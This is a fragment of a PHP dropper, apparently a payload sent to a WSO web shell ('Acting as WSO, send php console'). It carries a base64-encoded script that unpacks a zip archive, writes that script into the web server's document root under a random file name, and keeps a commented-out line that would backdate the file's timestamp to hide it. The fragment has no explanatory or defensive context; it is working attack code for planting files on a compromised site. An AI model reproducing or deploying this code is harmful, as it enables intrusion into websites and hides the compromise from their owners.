NpemU7DQogICAgfQ0KICB9DQogIGVsc2UgaWYgKCRwX21vZGU9PTMpDQogIHsNCiAgICB3aGlsZSAoJHBfc2l6ZSAhPSAwKQ0KICAgIHsNCiAgICAgICR2X3JlYWRfc2l6ZSA9ICgkcF9zaXplIDwgUENMWklQX1JFQURfQkxPQ0tfU0laRSA/ICRwX3NpemUgOiBQQ0xaSVBfUkVBRF9CTE9DS19TSVpFKTsNCiAgICAgICR2X2J1ZmZlciA9IEBnenJlYWQoJHBfc3JjLCAkdl9yZWFkX3NpemUpOw0KICAgICAgQGd6d3JpdGUoJHBfZGVzdCwgJHZfYnVmZmVyLCAkdl9yZWFkX3NpemUpOw0KICAgICAgJHBfc2l6ZSAtPSAkdl9yZWFkX3NpemU7DQogICAgfQ0KICB9DQoNCiAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KZnVuY3Rpb24gUGNsWmlwVXRpbFJlbmFtZSgkcF9zcmMsICRwX2Rlc3QpDQp7DQogICR2X3Jlc3VsdCA9IDE7DQoNCiAgaWYgKCFAcmVuYW1lKCRwX3NyYywgJHBfZGVzdCkpIHsNCg0KICAgIGlmICghQGNvcHkoJHBfc3JjLCAkcF9kZXN0KSkgew0KICAgICAgJHZfcmVzdWx0ID0gMDsNCiAgICB9DQogICAgZWxzZSBpZiAoIUB1bmxpbmsoJHBfc3JjKSkgew0KICAgICAgJHZfcmVzdWx0ID0gMDsNCiAgICB9DQogIH0NCg0KICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQpmdW5jdGlvbiBQY2xaaXBVdGlsT3B0aW9uVGV4dCgkcF9vcHRpb24pDQp7DQogIA0KICAkdl9saXN0ID0gZ2V0X2RlZmluZWRfY29uc3RhbnRzKCk7DQogIGZvciAocmVzZXQoJHZfbGlzdCk7ICR2X2tleSA9IGtleSgkdl9saXN0KTsgbmV4dCgkdl9saXN0KSkgew0KICAgICR2X3ByZWZpeCA9IHN1YnN0cigkdl9rZXksIDAsIDEwKTsNCiAgICBpZiAoKCAgICgkdl9wcmVmaXggPT0gJ1BDTFpJUF9PUFQnKQ0KICAgICAgICAgfHwgKCR2X3ByZWZpeCA9PSAnUENMWklQX0NCXycpDQogICAgICAgICB8fCAoJHZfcHJlZml4ID09ICdQQ0xaSVBfQVRUJykpDQogICAgICAgICYmICgkdl9saXN0WyR2X2tleV0gPT0gJHBfb3B0aW9uKSkgew0KICAgICAgcmV0dXJuICR2X2tleTsNCiAgICB9DQogIH0NCiAgDQogICR2X3Jlc3VsdCA9ICdVbmtub3duJzsNCg0KICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQpmdW5jdGlvbiBQY2xaaXBVdGlsVHJhbnNsYXRlV2luUGF0aCgkcF9wYXRoLCAkcF9yZW1vdmVfZGlza19sZXR0ZXI9dHJ1ZSkNCnsNCiAgaWYgKHN0cmlzdHIocGhwX3VuYW1lKCksICd3aW5kb3dzJykpIHsNCiAgICBpZiAoKCRwX3JlbW92ZV9kaXNrX2xldHRlcikgJiYgKCgkdl9wb3NpdGlvbiA9IHN0cnBvcygkcF9wYXRoLCAnOicpKSAhPSBmYWxzZSkpIHsNCiAgICAgICAgJHBfcGF0aCA9IHN1YnN0cigkcF9wYXRoLCAkdl9wb3NpdGlvbisxKTsNCiAgICB9DQogICAgaWYgKChzdHJwb3MoJHBfcGF0aCwgJ1xcJykgPiAwKSB8fCAoc3Vic3RyKCRwX3BhdGgsIDAsMSkgPT0gJ1xcJykpIHsNCiAgICAgICAgJHBfcGF0aCA9IHN0cnRyKCRwX3BhdGgsICdcXCcsICcvJyk7DQogICAgfQ0KICB9DQogIHJldHVybiAkcF9wYXRoOw0KfQ0KDQoNCg0KDQokYXJjaGl2ZSA9IG5ldyBQY2xaaXAoIm5wdHpvdy56aXAiKTsNCmlmICgkYXJjaGl2ZS0+ZXh0cmFjdCgpID09IDApIHsNCmRpZSgiRXJyb3IgOiAiLiRhcmNoaXZlLT5lcnJvckluZm8odHJ1ZSkpOw0KfQ0KZWxzZQ0Kew0KZGllKCIxNDI1NzU2ODU2Iik7CQ0KfQ==";
            $file_name = "4048ad7bdb2.php";
            if( !empty($_SERVER["REAL_DOCUMENT_ROOT"]) ){
                $doc_root = $_SERVER["REAL_DOCUMENT_ROOT"];
            } else {
                $doc_root = $_SERVER["DOCUMENT_ROOT"];
            }

            $f_n = $doc_root . "/" . $file_name;

            if ( !write_file($f_n, $a) )
                write_file($file_name, $a);

            function write_file($file_name, $a){

                if( file_exists($file_name) ){
                    copy($file_name, $file_name."_backup");
                }
                if( file_put_contents($file_name, base64_decode($a)) )
                {		
                    echo "OK file saved";
                    //touch($file_name, time() - 3600 * 24 * rand(10, 70));
                    return true;
                }

                return false;
            }
p2 = 
p3 = 
Acting as WSO, send php console.
